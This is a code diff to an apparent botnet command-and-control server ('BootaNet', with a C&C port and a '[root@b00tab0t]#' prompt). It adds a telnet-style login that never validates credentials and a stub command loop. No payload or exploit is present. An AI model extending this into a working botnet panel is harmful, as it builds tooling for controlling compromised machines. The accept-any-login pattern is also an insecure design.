@@ -4,7 +4,7 @@ from .client        import Client
 from .users.main    import User
 
 class BootaNet():
-    CNC_PORT:       int = 1337;
+    CNC_PORT:       int = 1338;
     WEB_PORT:       int = 80;
     SERVER:         bool;
     BUF_SZ:         int = 1024;
@@ -51,26 +51,36 @@ class BootaNet():
 
 
     def server_authorization(self, client) -> None:
+        client.send("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22".encode())
+        client.send("[?1000;1003;1006;1015h\r\n".encode())
         client.send("Username: ".encode())
         username = client.recv(self.BUF_SZ)
+        print(f"{username}")
 
         client.send("Password: ".encode())
-        password = client.recv(self.BUF_SZ)
+        password = client.recv(self.BUF_SZ).decode().strip()
         if password == "":
-            password = client.recv(self.BUF_SZ)
+            password = client.recv(self.BUF_SZ).decode().strip()
 
         # Validate Login
 
         new_client = Client(username, client)
         self.clients.append(new_client)
-        
         self.user_handler(new_client)
 
     def user_handler(self, client: Client) -> None:
         while(True):
             client.socket.send("[root@b00tab0t]# [~] ".encode())
-            data = client.socket.recv(self.BUF_SZ)
+            r_data = client.socket.recv(2)
+            data = r_data.decode().strip()
 
-            if len(data) < 2: continue;
+            if len(data) <= 1: 
+                client.socket.send("\r".encode())
+                continue;
 
-            print(f"{data}")
+            if data.startswith("help"):
+                client.socket.send("Test\r\n".encode())
+            else:
+                client.socket.send("[ X ] Error Invalid Command\r\n".encode())
+
+            print(f"{r_data} | {data}")
